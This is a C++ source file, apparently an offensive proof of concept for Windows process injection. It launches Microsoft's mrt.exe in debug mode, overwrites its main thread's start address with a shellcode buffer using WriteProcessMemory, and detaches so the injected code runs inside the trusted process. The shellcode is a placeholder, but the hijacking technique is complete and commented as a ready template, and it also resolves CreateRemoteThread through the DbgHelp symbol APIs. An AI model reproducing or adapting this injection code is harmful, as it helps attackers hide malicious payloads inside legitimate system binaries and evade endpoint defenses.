#include <iostream>
#include "windows.h"
#include "stdio.h"
#include "dbghelp.h"

int main(int argc, char* argv[])
{

	unsigned char buf[] =
		"Put_Your_Shellcode_Here";



	LPDEBUG_EVENT DbgEvent = new DEBUG_EVENT();

	LPSTARTUPINFOW si = new STARTUPINFOW();
	si->cb = sizeof(STARTUPINFOW);

	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	wchar_t cmdLine[] = L"C:\\Windows\\System32\\mrt.exe";

	if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, si, pi)) {// Create new process with DEBUG_PROCESS flag.

		printf("[+] Process [DEBUG] created successfully - PID: %d\n", pi->dwProcessId);
	}
	else {
		printf("[+] Couldn't create process. Exiting...");
		return -1;
	}



	for (int i = 0; i < 7; i++) {
		if (WaitForDebugEvent(DbgEvent, INFINITE)) {



			switch (DbgEvent->dwDebugEventCode)
			{

			case CREATE_PROCESS_DEBUG_EVENT:

				/* This event is triggered when the process is created. At this point, the main thread is Frozen (PsFreezeProcess)*/

				printf("[+] New Process Created - PID: %d\n", DbgEvent->dwProcessId);
				printf("[+] New Thread Created - TID: %d\n", DbgEvent->dwThreadId);
				printf("[+] Process lpStartAddress: 0x%08p\n", DbgEvent->u.CreateProcessInfo.lpStartAddress);
				printf("[+] Process Main Thread: 0x%08p\n\n", DbgEvent->u.CreateProcessInfo.hThread);

				break;
			case LOAD_DLL_DEBUG_EVENT:

				/* IMPORTANT: In this event, we call ReadProcessMemory (optionally) only to retrieve the names of the DLLs. However, this isn't
				necessary since NTDLL.dll is always the first library to be loaded in a Windows process (as it contains the Image Loader),
				followed by Kernel32.dll. Therefore, the first addresses are always NTDLL.dll and Kernel32.dll, respectively.
				*/

				/* Although we are retrieving these addresses from a remote process, it's worth noting that they are the same in all Windows
				processes because the operating system maps these libraries only once in the RAM.
				This occurs due to shared memory, which can be defined as memory that is visible to more than one process or that is present
				in more than one process's virtual address space.*/

				wchar_t imageName[MAX_PATH];

				PVOID remoteAddr;
				size_t dwRead;
				if (ReadProcessMemory(pi->hProcess, DbgEvent->u.LoadDll.lpImageName, &remoteAddr, sizeof(LPVOID), &dwRead))  // read 256 chars
				{
					printf("[+] DLL Remote Address: 0x%08p\n", remoteAddr);
					if (ReadProcessMemory(pi->hProcess, remoteAddr, imageName, MAX_PATH, &dwRead)) {
						printf("[+] DLL Name: %ls\n", imageName);
					}
				}
				printf("[+] DLL Base Address: 0x%08p\n", DbgEvent->u.LoadDll.lpBaseOfDll);
				printf("[+] DLL hFile: 0x%08p\n\n", DbgEvent->u.LoadDll.hFile);

				break;

			case CREATE_THREAD_DEBUG_EVENT:

				/*In this Event we retrieve general and important information related to new created threads.*/
				printf("[+] New Thread Created: 0x%08p\n", DbgEvent->u.CreateThread.lpStartAddress);
				printf("[+] New Thread Handle: 0x%08p\n", DbgEvent->u.CreateThread.hThread);
				printf("[+] New Thread ThreadLocalBase: 0x%08p\n\n", DbgEvent->u.CreateThread.lpThreadLocalBase);
				break;

			case EXCEPTION_DEBUG_EVENT:

				/* Reports an exception debugging event. This event is significant as it provides important information, such as the location
				where an exception occurred. */
				if (DbgEvent->u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) {
					printf("[+] Breakpoint was successfully triggered.\n");
					printf("[+] Exception Address [RIP]: 0x%08p\n", DbgEvent->u.Exception.ExceptionRecord.ExceptionAddress);
					break;
				}




			}

			size_t writtenBytes;

			if (i == 6) {

				/* Since we have obtained the lpStartAddress of the Main Thread (CREATE_PROCESS_DEBUG_EVENT), we can write our code to that location. */

				if (WriteProcessMemory(pi->hProcess, DbgEvent->u.CreateProcessInfo.lpStartAddress, buf, sizeof(buf), &writtenBytes)) {
					printf("[+] Shellcode was successfully written [%lu bytes]\n\n", (unsigned long)writtenBytes);
					if (!DebugActiveProcessStop(pi->dwProcessId)) { // Once this API is called, the thread is unfrozen and it will continue its flow execution.
						std::cerr << "Failed to detach from the process, error: " << GetLastError() << std::endl;
						return -1;
					}


					std::cout << "[+] Successfully detached from the DEBUG process. Continuing the process' flow execution..." << std::endl;

				}
				else {
					printf("[!] Couldn't write shellcode! %d", GetLastError());
					return -1;
				}
			}

			ContinueDebugEvent(pi->dwProcessId, pi->dwThreadId, DBG_CONTINUE);/* (Optional) --> This is only useful to call if we want to get / retrieve -
			the loaded modules, created threads, new exceptions, etc. Therefore, if we are only interested in hijacking the execution flow,
			we don't have to call this function as DebugActiveProcessStop will do it for us.*/
		}



	}

	/* These APIs (SymInitialize, SymFromName, SymCleanup) load debugging files (.PDB) into memory via CreateFileMapping. Next, these .PDB files are parsed
	dynamically, allowing us to obtain the address of any function.

	These APIs are commonly used by debuggers and serve as an alternative to GetProcAddress().

	IMPORTANT: In order to use these functions, we have to add Dbghelp.lib as an additional dependency in our project: 
	In the project properties window, navigate to "Configuration Properties" > "Linker" > "Input."
    In the "Additional Dependencies" field, add Dbghelp.lib.
	*/

	SymInitialize(GetCurrentProcess(), NULL, TRUE);
	SYMBOL_INFO symbol;
	symbol.SizeOfStruct = sizeof(symbol);
	SymFromName(GetCurrentProcess(), "CreateRemoteThread", &symbol);
	printf("[+] CreateRemoteThread Address: 0x%08p\n\n", (LPVOID)symbol.Address);
	SymCleanup(GetCurrentProcess());


}